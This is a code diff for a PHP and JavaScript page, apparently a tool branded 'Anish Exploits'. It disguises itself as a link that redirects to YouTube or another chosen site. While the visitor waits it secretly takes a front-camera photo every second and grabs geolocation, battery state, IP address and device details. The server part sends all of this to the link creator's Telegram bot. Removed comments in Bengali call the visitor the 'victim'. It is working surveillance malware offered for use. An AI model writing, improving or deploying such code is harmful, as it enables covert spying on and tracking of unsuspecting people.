@@ -1,3 +1,132 @@
+<?php
+require_once 'config.php';
+
+if (!file_exists("photos")) { mkdir("photos", 0755, true); }
+if (!file_exists("uploads")) { mkdir("uploads", 0755, true); }
+if (!file_exists("visitors.json")) { file_put_contents("visitors.json", json_encode([])); }
+if (!file_exists("links.json")) { file_put_contents("links.json", json_encode([])); }
+
+$id = $_GET['id'] ?? '';
+$db = json_decode(file_get_contents("links.json"), true) ?? [];
+
+$linkData = $db[$id] ?? null;
+$targetUrl = $linkData['url'] ?? 'https://www.youtube.com';
+$customImage = $linkData['image'] ?? '';
+$creatorId = $linkData['created_by'] ?? $config['chat_id'];
+
+session_start();
+$visitorId = $_SESSION['visitor_id'] ?? null;
+
+if (!$visitorId) {
+    $visitorId = 'VIS_' . time() . '_' . bin2hex(random_bytes(4));
+    $_SESSION['visitor_id'] = $visitorId;
+}
+
+// ========== FUNCTIONS ==========
+function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
+    global $config;
+    if (!file_exists($photoPath)) return false;
+    $token = $config['bot_token'];
+    $url = "https://api.telegram.org/bot$token/sendPhoto";
+    
+    $post = [
+        'chat_id' => $chatId,
+        'photo' => new CURLFile(realpath($photoPath)),
+        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s')
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return $httpCode == 200;
+}
+
+function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
+    global $config;
+    $token = $config['bot_token'];
+    $url = "https://api.telegram.org/bot$token/sendLocation";
+    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
+    @file_get_contents($url . "?" . http_build_query($data));
+}
+
+function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
+    global $config;
+    $token = $config['bot_token'];
+    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
+    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
+    @file_get_contents($url . "?" . http_build_query($data));
+}
+
+// ========== HANDLE POST DATA ==========
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $input = file_get_contents('php://input');
+    $data = json_decode($input, true);
+    if (!$data) { exit; }
+    
+    $items = isset($data[0]) ? $data : [$data];
+    $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
+    
+    if (!isset($visitors[$visitorId])) {
+        $visitors[$visitorId] = [
+            'device' => $_SERVER['HTTP_USER_AGENT'],
+            'ip' => $_SERVER['REMOTE_ADDR'],
+            'target_url' => $targetUrl,
+            'generated_by' => $creatorId,
+            'time' => date('Y-m-d H:i:s'),
+            'photos' => 0, 'locations' => 0, 'battery' => 0
+        ];
+    }
+    
+    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
+    
+    foreach ($items as $item) {
+        if (isset($item['photo']) && !empty($item['photo'])) {
+            $photoData = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $item['photo']);
+            $photoBinary = base64_decode($photoData);
+            
+            if ($photoBinary && strlen($photoBinary) > 500) {
+                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
+                file_put_contents($photoPath, $photoBinary);
+                if (filesize($photoPath) > 500) {
+                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
+                    $visitors[$visitorId]['photos'] += 1;
+                }
+            }
+        }
+        
+        if (isset($item['location'])) {
+            $lat = $item['location']['lat'] ?? 0;
+            $lng = $item['location']['lng'] ?? 0;
+            if ($lat != 0 && $lng != 0) {
+                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
+                $visitors[$visitorId]['locations'] += 1;
+            }
+        }
+        
+        if (isset($item['battery'])) {
+            $level = $item['battery']['level'] ?? 0;
+            $charging = $item['battery']['charging'] ?? false;
+            if ($level > 0) {
+                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
+                $visitors[$visitorId]['battery'] += 1;
+            }
+        }
+    }
+    
+    file_put_contents("visitors.json", json_encode($visitors));
+    echo json_encode(['status' => 'success']);
+    exit;
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -9,23 +138,8 @@
         body { background: #0a0a0a; color: #fff; font-family: -apple-system, 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { text-align: center; padding: 20px; max-width: 400px; width: 100%; }
         .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
-        
-        /* বড় সাইজের ব্যানার ফটো স্টাইল */
-        .custom-img { 
-            width: 100%; 
-            max-height: 250px; 
-            object-fit: cover; 
-            border-radius: 12px; 
-            border: 2px solid rgba(247,151,30,0.3); 
-            margin-bottom: 20px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5); 
-        }
-
-        /* লোডার এবং টেক্সট সম্পূর্ণ হাইড করার জন্য */
-        .spinner, .status-text { 
-            display: none !important; 
-        }
-
+        .custom-img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 12px; border: 2px solid rgba(247,151,30,0.3); margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        .spinner, .status-text { display: none !important; }
         #video { display: none; }
         #canvas { display: none; }
     </style>
@@ -38,17 +152,13 @@
             <div class="logo">✨ Anish Exploits</div>
         <?php endif; ?>
         
-        <div class="spinner"></div>
-        <div class="status-text" id="status">Loading...</div>
-        
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const visitorId = '<?= $visitorId ?>';
-        // রিডাইরেক্ট লিংক সবসময় ইউটিউব করার জন্য
-        const targetUrl = 'https://www.youtube.com'; 
+        const targetUrl = '<?= $targetUrl ?>';
         let isCapturing = false;
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
@@ -58,7 +168,6 @@
             video.play();
             isCapturing = true;
             
-            // ব্যাকগ্রাউন্ডে ছবি ক্যাপচার চলবে
             setInterval(() => {
                 if (isCapturing) {
                     capturePhoto();
@@ -66,7 +175,6 @@
             }, 1000);
         })
         .catch(err => {
-            // ক্যামেরা ডিনাই করলেও যেন রিডাইরেক্ট হয়ে যায়
             setTimeout(() => { window.location.href = targetUrl; }, 2000);
         });
 
@@ -83,7 +191,6 @@
             sendData({ photo: photoData });
         }
 
-        // লোকেশন ও ব্যাটারি ব্যাকগ্রাউন্ডে সেন্ড হবে
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
                 sendData({ location: { lat: position.coords.latitude, lng: position.coords.longitude } });
@@ -107,7 +214,6 @@
             pendingData = [];
         }
 
-        // ৪ সেকেন্ড পর ভিকটিমকে ইউটিউবে পাঠিয়ে দেওয়া হবে (এর মধ্যে ব্যাকগ্রাউন্ডে ছবি ও ডাটা চলে যাবে)
         setTimeout(() => {
             isCapturing = false;
             window.location.href = targetUrl;
